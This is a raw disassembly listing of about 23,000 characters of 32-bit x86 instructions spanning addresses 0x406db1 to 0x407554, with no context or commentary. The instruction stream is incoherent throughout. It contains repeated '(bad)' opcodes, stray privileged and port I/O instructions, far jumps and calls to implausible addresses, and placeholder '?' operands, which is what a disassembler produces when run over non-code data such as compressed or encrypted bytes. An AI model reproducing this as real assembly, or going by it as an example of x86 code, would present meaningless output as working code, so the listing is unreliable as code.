  406db1:	or     eax,0xa305d869
  406db6:	xchg   DWORD PTR [esi-0x7d9cec03],ebx
  406dbc:	sahf   
  406dbd:	jl     0x406e27
  406dbf:	ja     0x406dae
  406dc1:	loope  0x406dee
  406dc3:	mov    DWORD PTR [ebx+0x7b],esp
  406dc6:	and    esi,esp
  406dc8:	add    DWORD PTR [edx+edx*1],ebx
  406dcb:	sbb    bl,BYTE PTR [ebp+0x2d5288c]
  406dd1:	repnz adc DWORD PTR [edx+0x4f],ebx
  406dd5:	cmp    eax,eax
  406dd7:	jle    0x406e4e
  406dd9:	data16 out 0xe9,al
  406ddc:	bound  ebx,QWORD PTR [esi-0x511f45e7]
  406de2:	adc    al,0x1d
  406de4:	mov    dh,0xfc
  406de6:	sti    
  406de7:	imul   eax,DWORD PTR [esp+esi*8],0x505488ce
  406dee:	jb     0x406df8
  406df0:	push   eax
  406df1:	rcl    DWORD PTR [ebp+0xd],0x94
  406df5:	(bad)  
  406df6:	cmp    eax,eax
  406df8:	scas   eax,DWORD PTR es:[edi]
  406df9:	push   es
  406dfa:	popf   
  406dfb:	mov    ebx,0x1622750b
  406e00:	stc    
  406e01:	ins    DWORD PTR es:[edi],dx
  406e02:	dec    eax
  406e03:	and    al,ah
  406e05:	xor    al,0xfd
  406e07:	fist   DWORD PTR [edi+0x39e36c5d]
  406e0d:	dec    edi
  406e0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e0f:	inc    ecx
  406e10:	xor    DWORD PTR [ebx],esp
  406e12:	mov    ?,WORD PTR [esi]
  406e14:	lock xor eax,0x2154c911
  406e1a:	dec    esp
  406e1b:	jnp    0x406e19
  406e1d:	int    0xa5
  406e1f:	inc    edx
  406e20:	gs push esi
  406e22:	dec    esp
  406e23:	push   0xffffffca
  406e25:	lock dec ebp
  406e27:	mov    eax,0xa47291ae
  406e2c:	mov    ecx,0x2334fd3f
  406e31:	es jb  0x406df8
  406e34:	in     eax,dx
  406e35:	sbb    eax,0x298a212b
  406e3a:	add    edx,DWORD PTR [edi+0x6a]
  406e3d:	shl    BYTE PTR [edx-0x3c80f294],cl
  406e43:	adc    DWORD PTR [ebx],ecx
  406e45:	fstp   st(3)
  406e47:	mov    esi,0x55885a21
  406e4c:	xchg   esp,ebp
  406e4e:	mov    ?,WORD PTR [edi-0x1a823c40]
  406e54:	push   0x23
  406e56:	imul   eax,DWORD PTR [ecx+eax*2+0x71],0xffffffeb
  406e5b:	fwait
  406e5c:	mov    esp,0xfcaff155
  406e61:	enter  0x619e,0xfa
  406e65:	sub    eax,ebp
  406e67:	fisttp QWORD PTR ds:0x6530f9ad
  406e6d:	mov    ebp,0x25a434a9
  406e72:	push   edx
  406e73:	jg     0x406e9d
  406e75:	adc    DWORD PTR [esi],edi
  406e77:	mov    DWORD PTR [ecx-0x15],esi
  406e7a:	sub    al,0xbe
  406e7c:	outs   dx,BYTE PTR ds:[esi]
  406e7d:	int    0xec
  406e7f:	dec    ecx
  406e80:	lahf   
  406e81:	xchg   BYTE PTR [ecx-0x36],ch
  406e84:	sahf   
  406e85:	sbb    ch,bh
  406e87:	pop    eax
  406e88:	lds    eax,FWORD PTR ds:0x10bcd379
  406e8e:	ja     0x406e1f
  406e90:	dec    eax
  406e91:	jecxz  0x406e7e
  406e93:	lock xor ecx,eax
  406e96:	stos   BYTE PTR es:[edi],al
  406e97:	retf   
  406e98:	shr    dl,1
  406e9a:	adc    dh,dl
  406e9c:	daa    
  406e9d:	xor    al,0xf0
  406e9f:	dec    ebp
  406ea0:	add    al,0x5e
  406ea2:	push   edx
  406ea3:	stos   DWORD PTR es:[edi],eax
  406ea4:	push   edx
  406ea5:	sbb    BYTE PTR [ebp-0x7d76bbab],cl
  406eab:	adc    ch,BYTE PTR [edx*2-0x63c172a8]
  406eb2:	xchg   esp,eax
  406eb3:	ja     0x406e36
  406eb5:	cld    
  406eb6:	mov    al,0x96
  406eb8:	jle    0x406eca
  406eba:	mov    ecx,ebp
  406ebc:	scas   eax,DWORD PTR es:[edi]
  406ebd:	jl     0x406f1a
  406ebf:	shl    BYTE PTR ds:[esi],0xcb
  406ec3:	lds    eax,FWORD PTR [esp+edx*2-0x68]
  406ec7:	push   ecx
  406ec8:	jne    0x406ec6
  406eca:	imul   esp,DWORD PTR [esi-0x43],0x57a16460
  406ed1:	shl    eax,1
  406ed3:	xchg   ebx,eax
  406ed4:	push   edx
  406ed5:	xor    BYTE PTR [eax+0x6a89d055],ch
  406edb:	in     eax,0x8d
  406edd:	push   es
  406ede:	(bad)  
  406edf:	ins    DWORD PTR es:[edi],dx
  406ee0:	mov    ds:0xef4cf512,al
  406ee5:	jge    0x406ed2
  406ee7:	or     BYTE PTR [eax],bl
  406ee9:	cwde   
  406eea:	and    ebp,0x68e6749e
  406ef0:	pop    eax
  406ef1:	pop    ss
  406ef2:	inc    ebp
  406ef3:	jbe    0x406f2a
  406ef5:	into   
  406ef6:	sub    ch,BYTE PTR [eax+eax*2]
  406ef9:	add    BYTE PTR [edx],0x4a
  406efc:	cdq    
  406efd:	cdq    
  406efe:	mov    WORD PTR [ecx+0x49abe3c3],ss
  406f04:	js     0x406ed9
  406f06:	sahf   
  406f07:	and    ebx,DWORD PTR [ecx-0x275cf3ba]
  406f0d:	cli    
  406f0e:	scas   eax,DWORD PTR es:[edi]
  406f0f:	ins    BYTE PTR es:[edi],dx
  406f10:	xchg   ecx,eax
  406f11:	or     BYTE PTR [ecx],dl
  406f13:	mov    BYTE PTR [edi+edi*8],dh
  406f16:	shl    DWORD PTR [eax-0xf],cl
  406f19:	dec    eax
  406f1a:	mov    cl,0x6e
  406f1c:	or     ch,BYTE PTR [edi+0xa8ce41a]
  406f22:	fist   DWORD PTR [edx+edi*4+0x2d85aa54]
  406f29:	and    edi,DWORD PTR [ecx+0x2a]
  406f2c:	xor    dh,BYTE PTR [edx+0x759a3039]
  406f32:	pusha  
  406f33:	or     DWORD PTR [ebp-0x393d5082],edx
  406f39:	mov    esp,0x9ef47648
  406f3e:	pop    ebp
  406f3f:	add    DWORD PTR ds:0x96f6ed2,0x5
  406f46:	mov    eax,0xfe2949d9
  406f4b:	es into 
  406f4d:	and    al,0x93
  406f4f:	cdq    
  406f50:	repnz dec edi
  406f52:	ins    DWORD PTR es:[edi],dx
  406f53:	aas    
  406f54:	push   ss
  406f55:	sbb    bh,dh
  406f57:	imul   esi,esp,0xffffffa7
  406f5a:	xor    ah,bh
  406f5c:	arpl   sp,cx
  406f5e:	popa   
  406f5f:	mov    dl,0x85
  406f61:	nop
  406f62:	scas   eax,DWORD PTR es:[edi]
  406f63:	dec    ecx
  406f64:	scas   al,BYTE PTR es:[edi]
  406f65:	xchg   edi,eax
  406f66:	xlat   BYTE PTR ds:[ebx]
  406f67:	aas    
  406f68:	or     ah,BYTE PTR [edi]
  406f6a:	loope  0x406ef8
  406f6c:	test   DWORD PTR [ecx-0x736f7fe8],ebx
  406f72:	mov    dh,0x3c
  406f74:	push   eax
  406f75:	retf   
  406f76:	aaa    
  406f77:	lds    esp,FWORD PTR [eax+0x5ca54102]
  406f7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f7e:	jae    0x406faf
  406f80:	adc    esi,DWORD PTR [ebx-0x2]
  406f83:	ins    BYTE PTR es:[edi],dx
  406f84:	cmp    al,0xc1
  406f86:	mov    eax,0xf35f9c3f
  406f8b:	int3   
  406f8c:	sub    ah,bh
  406f8e:	and    BYTE PTR [esi],bl
  406f90:	mov    ah,0x71
  406f92:	leave  
  406f93:	bound  esp,QWORD PTR [ecx+0x5f44ee03]
  406f99:	hlt    
  406f9a:	dec    ebp
  406f9b:	or     al,0xec
  406f9d:	fcom   DWORD PTR [eax+eiz*1-0x71]
  406fa1:	cdq    
  406fa2:	push   edx
  406fa3:	mov    bl,0xd5
  406fa5:	(bad)  
  406fa7:	in     eax,0x88
  406fa9:	mov    bh,0x12
  406fab:	sbb    BYTE PTR [ebp-0x39],bl
  406fae:	aaa    
  406faf:	and    al,0xa0
  406fb1:	scas   eax,DWORD PTR es:[edi]
  406fb2:	and    dh,0x8
  406fb5:	mov    eax,0xb42440d9
  406fba:	icebp  
  406fbb:	dec    ebx
  406fbc:	icebp  
  406fbd:	iret   
  406fbe:	test   BYTE PTR [ecx+eax*8+0x1f],dh
  406fc2:	scas   al,BYTE PTR es:[edi]
  406fc3:	icebp  
  406fc4:	inc    esi
  406fc5:	sub    eax,eax
  406fc7:	pop    ss
  406fc8:	loopne 0x406faa
  406fca:	adc    BYTE PTR [ecx-0x2cacbab8],cl
  406fd0:	ret    
  406fd1:	adc    BYTE PTR [esi],0xcb
  406fd4:	es ins BYTE PTR es:[edi],dx
  406fd6:	pop    ebp
  406fd7:	mov    db4,edx
  406fda:	ins    DWORD PTR es:[edi],dx
  406fdb:	sbb    ecx,DWORD PTR [eax]
  406fdd:	cmp    BYTE PTR [ecx-0x16],dh
  406fe0:	pop    DWORD PTR [ecx-0x11]
  406fe3:	xchg   ebx,eax
  406fe4:	loopne 0x407060
  406fe6:	es sub eax,0xb6311cde
  406fec:	loope  0x407042
  406fee:	pop    ebx
  406fef:	push   ecx
  406ff0:	and    al,0x9c
  406ff2:	xchg   ebx,eax
  406ff3:	xor    bl,ah
  406ff5:	int    0x5e
  406ff7:	sahf   
  406ff8:	adc    ah,BYTE PTR [esi+0x112b49b0]
  406ffe:	push   ds
  406fff:	sar    dh,0xe9
  407002:	adc    ecx,eax
  407004:	and    bh,BYTE PTR [eax+0x54]
  407007:	pushf  
  407008:	add    eax,0xd71b079c
  40700d:	stos   BYTE PTR es:[edi],al
  40700e:	cmc    
  40700f:	pop    es
  407010:	jb     0x40700e
  407012:	mov    ?,WORD PTR [edi+0x39940022]
  407018:	cs (bad) 
  40701a:	inc    edi
  40701b:	mov    ds:0xdb34f217,eax
  407020:	xchg   esp,eax
  407021:	lock rcl DWORD PTR fs:[ecx+ebx*2-0x49fd8e22],0x64
  40702b:	out    dx,al
  40702c:	mov    ah,0xbf
  40702e:	fwait
  40702f:	xor    dl,BYTE PTR [esi]
  407031:	xor    dh,BYTE PTR [eax]
  407033:	fisttp WORD PTR [edi-0x2f]
  407036:	or     eax,edx
  407038:	(bad)  
  407039:	xor    al,BYTE PTR [edi]
  40703b:	cwde   
  40703c:	mov    dl,0xa3
  40703e:	fwait
  40703f:	adc    DWORD PTR gs:[ebp-0x13eea1d6],edx
  407046:	fdiv   QWORD PTR ds:0x3fdc29b
  40704c:	outs   dx,BYTE PTR ds:[esi]
  40704d:	cmp    bh,ch
  40704f:	call   0x223a571e
  407054:	mov    bl,BYTE PTR [ebp-0x2cdd31ba]
  40705a:	aas    
  40705b:	je     0x40709f
  40705d:	jb     0x40700b
  40705f:	cmp    al,0xa7
  407061:	in     al,dx
  407062:	sbb    BYTE PTR [ebx],bl
  407064:	and    ebp,ecx
  407066:	mov    ds:0x8949104b,al
  40706b:	mov    al,ds:0xfdec588c
  407070:	cdq    
  407071:	adc    BYTE PTR [esi-0x14],dh
  407074:	pop    esi
  407075:	cmp    bh,bl
  407077:	xchg   edi,eax
  407078:	adc    BYTE PTR [eax],0x82
  40707b:	daa    
  40707c:	jmp    0x6b91:0x6d41fc29
  407083:	mov    BYTE PTR [ecx+0x6e],dl
  407086:	in     al,dx
  407087:	clc    
  407088:	jp     0x40707f
  40708a:	mov    dl,0x80
  40708c:	addr16 jmp 0x1c6d75a3
  407092:	imul   ebp,DWORD PTR [edx+0x4d],0xfffffff2
  407096:	aam    0x8
  407098:	std    
  407099:	sub    al,0xad
  40709b:	xchg   DWORD PTR [ebx],edi
  40709d:	inc    edx
  40709e:	pop    eax
  40709f:	outs   dx,DWORD PTR ds:[esi]
  4070a0:	xchg   DWORD PTR [edx],ebx
  4070a2:	(bad)
  4070a5:	fisttp WORD PTR [edx]
  4070a7:	jb     0x4070aa
  4070a9:	mov    al,ds:0x476898b6
  4070ae:	pop    ecx
  4070af:	(bad)  
  4070b0:	sbb    dl,BYTE PTR es:[ebp-0x6a]
  4070b4:	add    eax,0x8b64a8ca
  4070b9:	add    bh,0xe6
  4070bc:	inc    eax
  4070bd:	xchg   edx,eax
  4070be:	xor    al,BYTE PTR [esi+ecx*4+0x63]
  4070c2:	jmp    0x4c0e:0xbc012dbf
  4070c9:	add    eax,eax
  4070cb:	cmp    dl,BYTE PTR [eax-0x45]
  4070ce:	xchg   ecx,eax
  4070cf:	push   esp
  4070d0:	pop    ecx
  4070d1:	push   0x59961d79
  4070d6:	sub    esi,DWORD PTR [edi+0x1296307b]
  4070dc:	add    al,0xa2
  4070de:	hlt    
  4070df:	ror    BYTE PTR [ecx+edi*4+0x6b24387b],cl
  4070e6:	pop    ss
  4070e7:	lock mov eax,0xaaa8eb58
  4070ed:	jmp    0x407148
  4070ef:	xchg   ecx,eax
  4070f0:	fadd   QWORD PTR gs:[ebx]
  4070f3:	sbb    eax,0x9ce0e343
  4070f8:	shr    DWORD PTR [edi-0x79],cl
  4070fb:	out    dx,al
  4070fc:	mov    DWORD PTR [ebx+eax*4-0x40],ecx
  407100:	int3   
  407101:	xchg   ebp,eax
  407102:	cdq    
  407103:	push   esp
  407104:	sub    dh,ah
  407106:	cmc    
  407107:	jnp    0x4070b0
  407109:	cmp    al,0xfa
  40710b:	xor    bh,cl
  40710d:	and    cl,dl
  40710f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407110:	in     al,dx
  407111:	jns    0x407096
  407113:	pop    ebx
  407114:	sbb    esi,ebp
  407116:	outs   dx,DWORD PTR ds:[si]
  407118:	mov    bh,0xba
  40711a:	mov    cl,0x23
  40711c:	repz push esp
  40711e:	out    0x60,eax
  407120:	jne    0x4070eb
  407122:	add    DWORD PTR [ebx+ecx*4+0x301c7b18],0xffffffe3
  40712a:	std    
  40712b:	inc    ebp
  40712c:	repnz add al,0x9a
  40712f:	add    ebp,DWORD PTR [ebx]
  407131:	and    al,0x5e
  407133:	xchg   DWORD PTR [esi+edi*4],esi
  407136:	je     0x40711b
  407138:	cdq    
  407139:	ins    DWORD PTR es:[edi],dx
  40713a:	loopne 0x4070c8
  40713c:	dec    eax
  40713d:	data16 fsqrt 
  407140:	repnz cmp BYTE PTR [ecx-0x36],al
  407144:	mov    al,0xee
  407146:	jno    0x4070f4
  407148:	xchg   esp,eax
  407149:	es sbb al,0x92
  40714c:	mov    edi,0x73060b17
  407151:	sbb    BYTE PTR [ebp*4-0x3311c684],bh
  407158:	jmp    0x6067de4a
  40715d:	lock in al,0x89
  407160:	cmp    al,0xae
  407162:	push   es
  407163:	idiv   DWORD PTR es:[edi]
  407166:	gs scas eax,DWORD PTR es:[edi]
  407168:	xchg   esp,eax
  407169:	xchg   edi,eax
  40716a:	mov    dh,0x40
  40716c:	cdq    
  40716d:	and    DWORD PTR [edi],esi
  40716f:	call   0x94baa50a
  407174:	into   
  407175:	hlt    
  407176:	push   ss
  407177:	push   esi
  407178:	out    dx,eax
  407179:	and    DWORD PTR [ecx],eax
  40717b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40717c:	into   
  40717d:	pop    eax
  40717e:	mov    BYTE PTR [ecx+eax*4+0x1c],ch
  407182:	inc    eax
  407183:	test   DWORD PTR [ebp+0x586d5a71],0x3ab06539
  40718d:	mov    al,ds:0xf3ae6fe5
  407192:	repz hlt 
  407194:	retf   
  407195:	clc    
  407196:	jns    0x407118
  407198:	sar    BYTE PTR [edi-0x27],0x4a
  40719c:	cld    
  40719d:	sbb    DWORD PTR [ebx+0x36],ecx
  4071a0:	pop    ebx
  4071a1:	retf   
  4071a2:	push   eax
  4071a3:	mov    eax,0x26ac7dec
  4071a8:	mov    ch,dl
  4071aa:	jnp    0x40715a
  4071ac:	dec    ebx
  4071ad:	sub    ah,BYTE PTR [eax-0x6844eccd]
  4071b3:	test   ah,al
  4071b5:	mov    ah,0xbd
  4071b7:	pop    edx
  4071b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071b9:	xchg   DWORD PTR [ebx],ebx
  4071bb:	sar    edi,0x85
  4071be:	jecxz  0x4071e7
  4071c0:	and    ch,bh
  4071c2:	add    eax,0x362fbab5
  4071c7:	cmp    ecx,edi
  4071c9:	mov    al,ds:0xaffd4630
  4071ce:	bound  edi,QWORD PTR [edx]
  4071d0:	mov    dl,dl
  4071d2:	aaa    
  4071d3:	sbb    esp,ebp
  4071d5:	adc    ah,0xd5
  4071d8:	jge    0x4071c6
  4071da:	jae    0x4071dc
  4071dc:	js     0x4071fe
  4071de:	hlt    
  4071df:	stos   BYTE PTR es:[edi],al
  4071e0:	jno    0x407246
  4071e2:	cmp    BYTE PTR [ebp+0x35],bl
  4071e5:	inc    ecx
  4071e6:	mov    ch,0xb4
  4071e8:	and    al,0x5c
  4071ea:	fmul   QWORD PTR [edx+edx*2-0x6ad7e2a7]
  4071f1:	aaa    
  4071f2:	mov    DWORD PTR [ebp-0x6c12bd84],esi
  4071f8:	shrd   ebp,eax,cl
  4071fb:	cmp    DWORD PTR [esi],0xc5bdeb89
  407201:	out    0x67,eax
  407203:	cmc    
  407204:	and    cl,BYTE PTR [ebp+0x6f]
  407207:	and    ch,BYTE PTR [edi+0xb]
  40720a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40720b:	jno    0x4071a1
  40720d:	leave  
  40720e:	test   DWORD PTR [edi+0x40],edi
  407211:	shl    DWORD PTR [ecx-0x21d2fcba],1
  407217:	out    0xe4,al
  407219:	lahf   
  40721a:	jmp    0x1b4:0x808c031f
  407221:	cmp    al,0x9a
  407223:	scas   eax,DWORD PTR es:[edi]
  407224:	sbb    al,0x79
  407226:	cmp    DWORD PTR [ebx+0x3b],ebx
  407229:	in     al,dx
  40722a:	jae    0x4072a7
  40722c:	(bad)  
  40722d:	in     al,dx
  40722e:	lahf   
  40722f:	and    al,BYTE PTR ds:0xc329161f
  407235:	mov    bl,0xbd
  407237:	jg     0x40726d
  407239:	mov    ch,cl
  40723b:	cdq    
  40723c:	cld    
  40723d:	push   esp
  40723e:	cdq    
  40723f:	sub    al,0x9d
  407241:	pop    eax
  407242:	lock cmp bl,BYTE PTR [ebx+0x4b5b44c]
  407249:	fsubrp st(2),st
  40724b:	repz fdivp st(0),st
  40724e:	xchg   edi,eax
  40724f:	mov    ecx,0xabafbe8e
  407254:	sub    DWORD PTR [esi],esi
  407256:	inc    ebx
  407257:	xchg   ebp,eax
  407258:	out    dx,al
  407259:	fs in  al,0x23
  40725c:	xchg   esi,eax
  40725d:	iret   
  40725e:	sub    ch,BYTE PTR [esi]
  407260:	and    eax,0xf20c6f40
  407265:	jb     0x407247
  407267:	fstp   TBYTE PTR [edx]
  407269:	cmp    eax,0xf12e74a3
  40726e:	add    bh,BYTE PTR [eax+eiz*1+0x16]
  407272:	jnp    0x40720d
  407274:	rol    DWORD PTR [ebp+0x209e2cbf],0x6f
  40727b:	or     eax,0x8bb7ef8b
  407280:	retf   0xe308
  407283:	sbb    BYTE PTR [ecx],0xd1
  407286:	or     dl,BYTE PTR [esi-0xa54cf4]
  40728c:	or     eax,0x1341bbfb
  407291:	mov    bh,0x7c
  407293:	jo     0x407226
  407295:	adc    DWORD PTR [edx+ebx*8+0x774c63f5],edi
  40729c:	push   ecx
  40729d:	xchg   esp,eax
  40729e:	add    DWORD PTR [eax],0xffffffeb
  4072a1:	or     eax,0x71f31cc5
  4072a6:	mov    eax,0xf44089a
  4072ab:	xor    bl,BYTE PTR [ebp-0x74]
  4072ae:	ror    ebp,1
  4072b0:	call   0x1cff8544
  4072b5:	fist   WORD PTR ds:0xf6a0a35
  4072bb:	push   eax
  4072bc:	addr16 jb 0x4072b2
  4072bf:	je     0x4072d8
  4072c1:	xor    DWORD PTR [edi+0x45],edi
  4072c4:	pop    esi
  4072c5:	inc    eax
  4072c6:	dec    ebx
  4072c7:	dec    edx
  4072c8:	fstp   QWORD PTR [edi-0x6aa68ba5]
  4072ce:	mov    bl,0xb9
  4072d0:	xlat   BYTE PTR ds:[ebx]
  4072d1:	out    dx,eax
  4072d2:	loopne 0x40725d
  4072d4:	sbb    cl,ch
  4072d6:	pop    esp
  4072d7:	sub    al,0xd7
  4072d9:	jne    0x4072f6
  4072db:	sub    ecx,DWORD PTR [edi+0x11ac2f07]
  4072e1:	ss jo  0x407316
  4072e4:	mov    edx,0x6d4aca1e
  4072e9:	pusha  
  4072ea:	es aam 0xf9
  4072ed:	dec    esp
  4072ee:	adc    edx,DWORD PTR ds:0xd1bc1ec7
  4072f4:	iret   
  4072f5:	mov    fs:0x5bb3d976,al
  4072fb:	lea    edi,[edx]
  4072fd:	jbe    0x407287
  4072ff:	inc    BYTE PTR [ecx-0x39fc146e]
  407305:	or     al,0x4d
  407307:	mov    ds:0x3791ce8e,al
  40730c:	or     ebx,DWORD PTR [ebx-0x42]
  40730f:	(bad)  
  407310:	cwde   
  407311:	xchg   edi,eax
  407312:	pushf  
  407313:	sbb    al,0x25
  407315:	adc    eax,0x7a0e9f91
  40731a:	xchg   edi,eax
  40731b:	pop    esi
  40731c:	sub    eax,0xab73f32f
  407321:	mov    ch,0xd1
  407323:	outs   dx,DWORD PTR ds:[esi]
  407324:	jno    0x407320
  407326:	sti    
  407327:	in     al,dx
  407328:	fidivr DWORD PTR [edi+0x213d152c]
  40732e:	jmp    0xce86:0xf404ce2a
  407335:	hlt    
  407336:	pmaxub mm6,mm1
  407339:	ins    BYTE PTR es:[edi],dx
  40733a:	push   0x24
  40733c:	sbb    dl,BYTE PTR [ebx-0x2f]
  40733f:	adc    BYTE PTR ds:0x27c39936,al
  407345:	loopne 0x40736e
  407347:	js     0x4072d3
  407349:	test   eax,0x41d396d6
  40734e:	nop
  40734f:	push   edx
  407350:	popf   
  407351:	outs   dx,DWORD PTR ds:[esi]
  407352:	stos   BYTE PTR es:[edi],al
  407353:	push   es
  407354:	pop    esi
  407355:	scas   eax,DWORD PTR es:[edi]
  407356:	xchg   esp,eax
  407357:	jno    0x4072ea
  407359:	cdq    
  40735a:	test   BYTE PTR [esi+0x35],bl
  40735d:	or     esi,ebp
  40735f:	mov    bl,0x22
  407361:	push   ds
  407362:	popf   
  407363:	and    DWORD PTR [esi],0x3c
  407366:	ins    BYTE PTR es:[edi],dx
  407367:	shr    BYTE PTR [eax],cl
  407369:	mov    ds:0xfbc05c2c,eax
  40736e:	push   edi
  40736f:	push   ss
  407370:	jmp    0xc482:0x907bd708
  407377:	mov    esp,0xd56b9bc8
  40737c:	pop    ds
  40737d:	mov    WORD PTR [edi+0x44],es
  407380:	sbb    eax,0x5a5aab7
  407385:	pop    edx
  407386:	iret   
  407387:	in     eax,dx
  407388:	jne    0x4073bc
  40738a:	in     eax,0x7c
  40738c:	stos   BYTE PTR es:[edi],al
  40738d:	and    DWORD PTR [ebp+0x7a7e7bb0],0x69
  407394:	loopne 0x407328
  407396:	les    edx,FWORD PTR [edi-0x2a82e844]
  40739c:	(bad)  
  40739e:	repz sbb BYTE PTR [ecx+edx*4-0xc1703ab],bl
  4073a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4073a7:	int    0x3d
  4073a9:	mov    bl,0x31
  4073ab:	inc    ebp
  4073ac:	out    0xa7,al
  4073ae:	push   eax
  4073af:	mov    ds:0x4c81b8d5,al
  4073b4:	je     0x4073ce
  4073b6:	sub    edi,esp
  4073b8:	pop    ecx
  4073b9:	adc    ch,ch
  4073bb:	mov    BYTE PTR [eax-0x3cc82eec],dl
  4073c1:	jl     0x407411
  4073c3:	repnz test DWORD PTR [ebp-0x1652b360],ebx
  4073ca:	push   esi
  4073cb:	fimul  WORD PTR [ebx+esi*8+0x75]
  4073cf:	push   edx
  4073d0:	sub    al,0xd9
  4073d2:	lahf   
  4073d3:	test   al,0x8e
  4073d5:	xor    DWORD PTR [ecx+0x49],edx
  4073d8:	in     eax,0x92
  4073da:	push   cs
  4073db:	cmp    DWORD PTR [ecx],edx
  4073dd:	or     eax,0x470d9b8
  4073e2:	xchg   edx,eax
  4073e3:	sub    al,0xe
  4073e5:	jg     0x4073ac
  4073e7:	mov    esi,0x6edd9fef
  4073ec:	lods   eax,DWORD PTR ds:[esi]
  4073ed:	test   BYTE PTR [eax+0x10cd63b7],ch
  4073f3:	loopne 0x407471
  4073f5:	add    al,0x9a
  4073f7:	cs in  eax,dx
  4073f9:	int3   
  4073fa:	jecxz  0x4073fc
  4073fc:	push   0xffffffd8
  4073fe:	cdq    
  4073ff:	xchg   DWORD PTR [ecx+0x532de829],edx
  407405:	mul    BYTE PTR [ebx+0x6f]
  407408:	xchg   esp,eax
  407409:	jecxz  0x4073c9
  40740b:	xchg   esp,eax
  40740c:	mov    ds:0x50eda7bd,al
  407411:	sbb    eax,0x742489a
  407416:	jb     0x40739a
  407418:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407419:	inc    eax
  40741a:	les    edi,FWORD PTR [eax+0xc]
  40741d:	sub    al,BYTE PTR [edi]
  40741f:	imul   eax,DWORD PTR [eax],0x9899df07
  407425:	or     edi,DWORD PTR [edx+0x64]
  407428:	pop    ebp
  407429:	mov    esp,0x1dd63c2c
  40742e:	add    eax,0x7a6007b5
  407433:	out    dx,al
  407434:	xor    eax,0x94f4120d
  407439:	jns    0x4073e0
  40743b:	cmp    BYTE PTR [ebx],dh
  40743d:	hlt    
  40743e:	cmp    cl,BYTE PTR [edx-0x79fe23e1]
  407444:	or     edx,DWORD PTR [esi+eax*8+0x2b]
  407448:	mov    ecx,0x1c7e3db5
  40744d:	les    ecx,FWORD PTR [ebx]
  40744f:	xchg   sp,ax
  407451:	dec    edi
  407452:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407453:	jge    0x407434
  407455:	adc    al,0x64
  407457:	in     eax,0x93
  407459:	icebp  
  40745a:	and    DWORD PTR [eax-0xe],esi
  40745d:	push   ebx
  40745e:	cdq    
  40745f:	pusha  
  407460:	cmp    bl,bl
  407462:	jbe    0x40745e
  407464:	aad    0x50
  407466:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407467:	push   edx
  407468:	or     BYTE PTR ds:[eax+0x44],0x2d
  40746d:	arpl   WORD PTR [ecx+0x55],cx
  407470:	xchg   ecx,eax
  407471:	pusha  
  407472:	enter  0x1580,0xb4
  407476:	jnp    0x407408
  407478:	setbe  ah
  40747b:	jmp    0xc45edfab
  407480:	push   esi
  407481:	push   ss
  407482:	mov    eax,0x8a1d497e
  407487:	(bad)  
  407488:	(bad)  
  407489:	js     0x40742f
  40748b:	aam    0xf0
  40748d:	stc    
  40748e:	cmp    al,0xdb
  407490:	mov    bh,0x80
  407492:	fdivrp st(5),st
  407494:	push   esi
  407495:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407496:	mov    dl,0xdf
  407498:	ds add bl,bh
  40749b:	mov    BYTE PTR [edx],ah
  40749d:	aam    0xbc
  40749f:	jg     0x4074b0
  4074a1:	sti    
  4074a2:	xor    BYTE PTR ds:0x68e3a9c4,al
  4074a8:	sub    dl,dh
  4074aa:	cwde   
  4074ab:	lea    edx,[edx+0x47]
  4074ae:	fwait
  4074af:	xor    BYTE PTR [edi],0x7b
  4074b2:	int    0x4e
  4074b4:	jg     0x407474
  4074b6:	inc    eax
  4074b7:	imul   edi,DWORD PTR [ebx+0x661eb6e9],0xf1534159
  4074c1:	add    ah,BYTE PTR [ebx+0x66]
  4074c4:	in     eax,dx
  4074c5:	xor    eax,ecx
  4074c7:	ret    0xdeef
  4074ca:	das    
  4074cb:	or     al,0x34
  4074cd:	in     al,0x60
  4074cf:	or     BYTE PTR [ebx-0x6730edc4],0x8e
  4074d6:	shl    DWORD PTR [edi-0x3f88048f],1
  4074dc:	popa   
  4074dd:	mov    WORD PTR [eax+0x4d],ds
  4074e0:	sub    dh,ah
  4074e2:	pop    ebp
  4074e3:	pushf  
  4074e4:	shl    ebp,0x86
  4074e7:	fst    QWORD PTR [ebx-0x307cc4ea]
  4074ed:	push   ss
  4074ee:	push   DWORD PTR [edx]
  4074f0:	ins    BYTE PTR es:[edi],dx
  4074f1:	(bad)  [eax]
  4074f3:	add    ah,BYTE PTR [eax+0x344411b9]
  4074f9:	or     al,0x1c
  4074fb:	cld    
  4074fc:	pop    edi
  4074fd:	and    esi,0x68b01bac
  407503:	mov    ebp,0x47f4647e
  407508:	mov    ch,0xd2
  40750a:	lods   eax,DWORD PTR ds:[esi]
  40750b:	pop    esi
  40750c:	inc    esi
  40750d:	mov    bh,cl
  40750f:	add    BYTE PTR [ecx],dl
  407511:	stos   DWORD PTR es:[edi],eax
  407512:	mov    DWORD PTR [esi],esp
  407514:	cmc    
  407515:	fpatan 
  407517:	clc    
  407518:	jle    0x40758e
  40751a:	das    
  40751b:	inc    esp
  40751c:	push   es
  40751d:	mov    ecx,0xf86c0491
  407522:	fcomp  st(2)
  407524:	push   es
  407525:	sbb    ecx,esp
  407527:	jg     0x40750c
  407529:	ja     0x407519
  40752b:	mov    ds:0x64d1f04e,al
  407530:	mov    bl,0xa4
  407532:	dec    edx
  407533:	dec    ebx
  407534:	lahf   
  407535:	xchg   DWORD PTR [ecx+0x17],eax
  407538:	jo     0x4074cf
  40753a:	repnz stos BYTE PTR es:[edi],al
  40753c:	dec    esp
  40753d:	push   ecx
  40753e:	pop    ss
  40753f:	xchg   esi,eax
  407540:	sub    dl,cl
  407542:	xchg   ebx,eax
  407543:	or     al,0xe1
  407545:	add    eax,0x4b337cc1
  40754a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40754b:	ds leave 
  40754d:	pop    ss
  40754e:	in     eax,dx
  40754f:	add    eax,0x3e4a812f
  407554:	in     eax,dx
